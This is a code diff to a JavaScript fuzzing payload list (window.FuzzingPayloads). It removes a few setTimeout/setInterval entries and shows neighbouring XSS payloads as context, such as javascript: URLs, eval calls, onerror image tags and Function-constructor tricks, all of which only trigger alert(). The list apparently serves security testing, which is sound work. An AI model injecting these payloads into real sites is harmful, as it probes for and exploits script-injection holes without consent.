@@ -52,7 +52,6 @@ window.FuzzingPayloads = {
         'location="javascript:alert(\'XSS_45\')"',
         'window.location.href="javascript:alert(\'XSS_46\')"',
         'setTimeout("alert(\'XSS_47\')",100)',
-        'setInterval("alert(\'XSS_48\')",100)',
         'eval("alert(\'XSS_49\')")',
         'document.documentElement.innerHTML="<img src=x onerror=alert(\'XSS_50\')>"',
 
@@ -98,8 +97,6 @@ window.FuzzingPayloads = {
         '<body style="height:1000px" onwheel="alert(\'XSS_89\')">',
         '<div contextmenu="xss">Right-Click<menu id="xss" onshow="alert(\'XSS_90\')"></menu></div>',
         '(new Function(\'alert("XSS_91")\'))()',
-        'setTimeout(function(){alert("XSS_92")}, 10)',
-        'setInterval(function(){alert("XSS_93")}, 10)',
         'onerror=alert;throw\'XSS_94\'',
         'this["alert"]("XSS_95")',
         'alert?.("XSS_96")',
